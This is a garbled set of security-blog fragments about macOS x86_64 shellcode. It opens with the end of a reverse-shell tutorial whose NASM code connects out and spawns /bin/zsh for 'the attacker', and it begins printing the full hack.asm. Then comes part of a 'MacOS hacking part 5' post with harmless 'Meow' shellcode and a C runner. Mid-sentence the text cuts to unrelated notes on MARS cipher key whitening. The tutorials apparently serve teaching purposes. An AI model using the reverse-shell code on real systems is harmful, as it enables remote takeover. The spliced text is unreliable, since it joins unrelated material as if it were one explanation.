NULL\n\npush rdx             ; store NULL on stack\nmov rbx,'/bin/zsh'   ; store /bin/zsh in rbx\npush rbx             ; push it onto the stack\nmov rdi,rsp          ; rdi -> /bin/zsh\n\npush rdx             ; argv[1] -> NULL\npush rdi             ; argv[0] -> /bin/zsh\nmov rsi,rsp          ; store {\"/bin/zsh\",NULL} in rsi\n\npush 59              ; execve() syscall - 59\npop rax\nbts rax,25\nsyscall\n```\n\nWhat's happening in this last part of our code? The `xor rdx,rdx` nullifies `rdx`, which is used for `argv[1]` (the second argument to `execve()`). Then, the program prepares the arguments for the `execve()` system call, which is used to launch a program (`/bin/zsh` in this case).\nThen, `rdi` holds the path to the shell (`/bin/zsh`), and `rsi` holds the arguments for the shell (just the path and `NULL`). Finally, the `syscall` instruction then triggers `execve()` to run the shell.     \n\nThis step is final step: it runs a new shell on the compromised machine, providing the attacker with full control over the system.      \n\nIf we summarise our full code, it does the following:    \n\nIt creates a socket connection to a remote machine.      \nIt establishes the connection.      \nIt duplicates the socket file descriptor for `stdin`, `stdout`, and `stderr`.      \nIt executes a shell (`/bin/zsh`) to provide the attacker with control over the system.      \n\nSo, full source code for the first example is looks like this (`hack.asm`):      \n\n```nasm\nbits 64\n\nglobal start\n\nstart:\n   ; socket(AF_INET, SOCK_STREAM,0);\n   push 0x2             ; store 0x2 on stack\n   pop rdi              ; pop this value into rdi -> AF_INET\n\n   push 0x1             ; store 0x1 on stack\n   pop rsi              ; pop this value into rsi -> SOCK_STREAM\n\n   xor rdx,rdx          ; null out rdx -> 0x00\n\n   push 97              ; socket() syscall - 97\n   pop rax\n   bts rax,25\n "

      "title": "MacOS hacking part 5: shellcode running. Simple NASM and C (Intel) examples",

      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n    \n\nToday, we'll continue to go dive into macOS shellcoding for `x86_64`: how to write shellcode in Assembly and execute it from a C program - just like we do on Linux. But you'll quickly see: macOS plays by different rules. I'll show you what works, what doesn’t, and why.     \n\n### practical example 1\n\nLet's make the smallest possible \"shellcode\" - just write `Meow\\n` to stdout, then exit.      \n\nFirst of all, we need to push the string `Meow\\n` onto the stack:     \n\n```nasm\nmov rax, 0x0a776f654d    ; \"\\nwoeM\" in little-endian: 0x4d 65 6f 77 0a\npush rax                 ; put the string (plus null bytes) onto the stack\n```\n\nHere we encode `Meow\\n` as a single `64-bit` value and push it onto the stack. After this instruction, `rsp` points to our string in memory.    \n\nThen we prepare arguments for the write syscall:     \n\n```nasm\nmov rdi, 1               ; file descriptor 1 (stdout)\nmov rsi, rsp             ; pointer to our string (\"Meow\\n\")\nmov rdx, 5               ; string length (5 bytes)\n```\n\n`rdi` is the first argument (`fd = 1`, meaning stdout), `rsi` is the second argument (pointer to buffer) and `rdx` is the third argument (number of bytes to write).     \n\nThen call the write syscall:    \n\n```nasm\nmov rax, 0x2000004       ; syscall number for write (macOS x86_64)\nsyscall\n```\n\nAs I wrote in the previous posts, `write` is syscall `4`, so the full value is `0x2000004`.     \n\nFinally,  exit the process cleanly:      \n\n```nasm\nmov rax, 0x2000001       ; syscall number for exit\nxor rdi, rdi             ; exit code 0\nsyscall\n```\n\nThe logic is pretty simple: `exit` is syscall `1` (`0x2000001`). Then, we zero out `rdi` to specify exit code `0` (success).    \n\nSo the full source code is looks like this `meow.asm`:     \n\n```nasm\nglobal start\n\nsection .text\nstart:\n  mov rax, 0x0a776f654d     ; \"\\nwoeM\" in little-endian\n  push rax                  ; string now on stack\n\n  mov rdi, 1                ; fd = 1 (stdout)\n  mov rsi, rsp              ; pointer to \"Meow\\n\"\n  mov rdx, 5                ; length = 5 bytes\n  mov rax, 0x2000004        ; syscall: write\n  syscall\n\n  mov rax, 0x2000001        ; syscall: exit\n  xor rdi, rdi              ; exit code 0\n  syscall\n```\n\n### demo\n\nLet's check this code first, assembly and link:     \n\n```bash\nnasm -f macho64 meow.asm -o meow.o\nld -arch x86_64 -macos_version_min 14.0 -e start -static -o meow meow.o\n```\n\n    \n\nThen run it (in my case `Mac OS X Sonoma` VM):     \n\n```bash\n./meow\n```\n\n    \n\nAs you can see, everything is worked as expected, perfectly! =^..^=     \n\n### practical example 2\n\nMy favorite part: get the shellcode bytes!    \n\nTo run the shellcode from C, you need the opcodes. On linux, you can do it like this:     \n\n```cpp\n/*\nrun.c - a small skeleton program to run shellcode\n*/\n// bytecode here\nchar code[] = \"my shellcode here\";\n\nint main(int argc, char **argv) {\n  int (*func)();             // function pointer\n  func = (int (*)()) code;   // func points to our shellcode\n  (int)(*func)();            // execute a function code[]\n  // if our program returned 0 instead of 1, \n  // so our shellcode worked\n  return 1;\n}\n```\n\nOn Linux, you'd use `execstack -s` or compile with `-z execstack`.\nBut on macOS, there's **NO execstack**. The key schedule produces a set of round keys (`RK[]`):    \n\n```cpp\na += RK[0];\nb += RK[1];\nc += RK[2];\nd += RK[3];\n```\n\nThis immediately breaks any simple relationship between input and output, a trick modern ciphers call \"whitening\".      \n\nNext step is the main round operations (the Mars core).
